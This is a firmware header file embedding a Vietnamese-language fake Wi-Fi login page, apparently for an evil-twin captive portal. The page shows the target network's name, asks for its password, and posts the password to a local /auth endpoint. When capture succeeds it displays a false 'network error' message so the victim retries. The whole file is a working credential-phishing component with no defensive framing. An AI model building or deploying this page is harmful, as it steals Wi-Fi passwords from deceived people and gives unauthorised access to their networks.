#ifndef WEB_AUTH1_PAGE_H
#define WEB_AUTH1_PAGE_H

// Modern simple auth page
const char WEB_AUTH1_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wi-Fi</title>
  <style>
    body { font-family: Arial, sans-serif; background: #111; color: #eee; margin: 0; display:flex; align-items:center; justify-content:center; min-height:100vh; }
    .card { width: 90%; max-width: 360px; background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 16px; }
    h1 { margin: 0 0 12px 0; font-size: 18px; text-align:center; }
    p { margin: 0 0 16px 0; color:#aaa; text-align:center; }
    input[type=text] { width: 100%; padding: 10px 12px; border-radius: 6px; border: 1px solid #444; background:#111; color:#fff; box-sizing:border-box; }
    button { width: 100%; margin-top: 12px; padding: 10px 14px; border: 0; border-radius: 6px; background: #03a9f4; color: #fff; cursor: pointer; position: relative; }
    button:disabled { background: #666; cursor: not-allowed; }
    .spinner { display: none; width: 16px; height: 16px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .muted { color:#888; font-size:12px; text-align:center; margin-top:10px; }
  </style>
  </head>
  <body>
    <div class="card">
      <h1 id="ssidLine">Wi-Fi</h1>
      <p>Nhập mật khẩu cho mạng này</p>
      <input id="text" type="text" placeholder="Mật khẩu" maxlength="64" minlength="8" />
      <button id="submitBtn" onclick="submitText()">
        <span class="spinner" id="spinner"></span>
        <span id="btnText">Kết nối</span>
      </button>
      <div class="muted">Nhập mật khẩu để kết nối mạng này</div>
    </div>
    <script>
      function isValidWifiPassword(p){
        if(!p) return false;
        const len = p.length;
        return (len >= 8 && len <= 63 && /^[\x20-\x7E]+$/.test(p)) || 
               (len === 64 && /^[0-9A-Fa-f]{64}$/.test(p));
      }
      function submitText(){
        const v = (document.getElementById('text').value||'').trim();
        if(!isValidWifiPassword(v)){
          alert('Định dạng mật khẩu không hợp lệ');
          return;
        }
        const btn = document.getElementById('submitBtn');
        const spinner = document.getElementById('spinner');
        const btnText = document.getElementById('btnText');
        
        btn.disabled = true;
        spinner.style.display = 'inline-block';
        btnText.textContent = 'Đang kết nối...';
        
        fetch('/auth', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ text: v }) })
          .then(r=>r.json()).then(j=>{ 
            alert(j && j.success ? 'Lỗi mạng, thử lại!' : 'Gửi thất bại, thử lại'); 
          })
          .catch(()=>alert('Lỗi mạng'))
          .finally(()=>{
            btn.disabled = false;
            spinner.style.display = 'none';
            btnText.textContent = 'Kết nối';
          });
      }

      fetch('/status').then(r=>r.json()).then(j=>{
        if(j && j.ssid){
          document.getElementById('ssidLine').innerText = 'Nhập mật khẩu cho mạng ' + j.ssid;
        }
      }).catch(()=>{
      });
    </script>
  </body>
  </html>
)rawliteral";

#endif